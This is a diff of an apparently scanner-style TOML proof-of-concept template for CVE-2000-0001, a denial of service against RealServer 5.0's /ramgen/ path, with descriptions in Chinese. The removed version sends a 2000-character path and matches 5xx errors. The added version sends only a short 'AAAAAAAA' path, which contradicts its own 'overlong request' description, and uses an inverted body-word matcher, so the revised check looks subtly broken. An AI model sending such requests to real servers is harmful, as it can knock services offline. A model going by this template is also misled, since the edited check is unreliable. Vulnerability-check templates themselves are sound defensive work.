@@ -1,10 +1,14 @@
 [info]
-author = "ave"
-description = "RealNetworks RealServer 5.0 的 ramgen 模块未能正确校验请求路径长度，远程攻击者发送超长 ramgen 请求即可导致服务进程崩溃造成拒绝服务。本 PoC 发送一个长度异常的 GET /ramgen/ 请求，若服务在超时内断开或返回 5xx/异常则为存在漏洞。"
+author = "AVE"
+description = "向 RealServer 5.0 的 /ramgen/ 路径发送超长畸形请求，可导致 RealServer 服务进程崩溃，造成拒绝服务。攻击者无需认证，发送单个 HTTP GET 请求即可触发。"
 id = "POC-AVE-2000-0003"
-name = "CVE-2000-0001 RealNetworks RealServer 5.0 ramgen 拒绝服务 PoC"
+name = "RealNetworks RealServer 5.0 ramgen 拒绝服务 PoC"
 severity = "medium"
-tags = ["ave-2000-0003"]
+tags = [
+    "cve-2000-0001",
+    "dos",
+    "realserver",
+]
 vuln_id = [
     "CVE-2000-0001",
     "AVE-2000-0003",
@@ -15,19 +19,19 @@ logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/ramgen/{{repeat('A', 2000)}}"
+path = "/{{BaseURL}}/ramgen/AAAAAAAA"
 protocol = "http"
 
-[poc.requests.headers]
-Host = "{{Hostname}}"
-User-Agent = "AVE/1.0"
+[poc.requests.body]
+content = ""
+type = "raw"
 
 [[poc.requests.matchers]]
-expect = true
-status = [
-    500,
-    502,
-    503,
-    504,
+expect = false
+part = "body"
+type = "word"
+words = [
+    "404",
+    "500",
+    "Service Unavailable",
 ]
-type = "status"
